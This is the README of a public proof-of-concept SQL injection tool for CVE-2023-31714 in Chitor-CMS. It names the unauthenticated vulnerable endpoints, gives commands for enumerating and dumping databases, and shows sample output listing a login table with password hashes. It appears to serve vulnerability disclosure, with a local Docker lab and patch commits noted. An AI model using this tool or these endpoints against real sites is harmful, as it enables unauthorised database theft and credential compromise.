<a target="_blank" href="https://img.shields.io/badge/platform-linux-success.svg" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/platform-linux-success.svg">
</a>
<a target="_blank" href="https://img.shields.io/badge/version-1.1-yellow" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/version-1.1-yellow">
</a>
<a href="https://www.python.org/" rel="nofollow">
    <img src="https://img.shields.io/badge/python-3.7-red">
</a>
<h1>CVE-2023-31714 - Chitor-CMS < 1.1.2 Pre-Auth SQL Injection</h1>
<strong>Found by msd0pe</strong><br />
https://github.com/waqaskanju/Chitor-CMS<br />
Project by waqaskanju

<h2>chitor1.1.py (Patched since 69d3442 commit)</h2>
<strong>2023/04/13</strong><br />
SQL Injection was found in the /edit_school.php?id= endpoint and doesn't need any authentication.

<h2>chitor1.0.py (Became a Post-Auth SQL Injection since 5f76192 commit)</h2>
<strong>2023/04/09</strong><br />
SQL Injections was found in multiple endpoints suchs as /add_school_class.php?school= and doesn't need any authentifcation. Since 5f76192 commit, theses endpoints verify that the logged in user has editing rights. This check was already in place before but was not functional.

<h1>Installation</h1>

```bash
sudo apt install git virtualenv python3 python3-pip docker-compose
git clone https://github.com/msd0pe-1/chitor-sqli
virtualenv -p python3 venv
source venv/bin/activate
pip3 install requests prettytable

TO START THE VULNERABLE DOCKER:
  - sudo ./run.sh [1.0|1.1]
TO STOP AND CLEAN THE DOCKER:
  - sudo ./clean.sh
```

<h1>Usage</h1>

```bash
Usage: python chitor1.1.py [options]

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -u URL, --url=URL     target url
  --dbs                 list databases
  -D DATABASE, --db=DATABASE
                        select a database
  --tables              list tables
  -T TABLE, --table=TABLE
                        select a table
  --dump                dump the content

  Examples:
    python3 chitor1.1.py -u http://127.0.0.1 --dbs
    python3 chitor1.1.py -u http://127.0.0.1 -D chitor_db --tables
    python3 chitor1.1.py -u http://127.0.0.1 -D chitor_db -T login --dump

  Chitor-CMS < 1.1.2 Pre-Auth SQL Injection.
  Source code put in public domain by msd0pe,no Copyright
  Any malicious or illegal activity may be punishable by law
  Use at your own risk
```

<h1>Example</h1>

```bash
python3 chitor1.1.py -u http://127.0.0.1 -D chitor_db -T login --dump
+----+-------------+------------+----------------------------------+--------+
| Id | Employee_Id | User_Name  |             Password             | Status |
+----+-------------+------------+----------------------------------+--------+
| 1  |      1      |   Guest    | adb831a7fdd83dd1e2a309ce7591dff8 |   1    |
| 2  |      2      | waqaskanju | ################################ |   1    |
| 3  |      3      |   admin    | 21232f297a57a5a743894a0e4a801fc3 |   1    |
+----+-------------+------------+----------------------------------+--------+
```
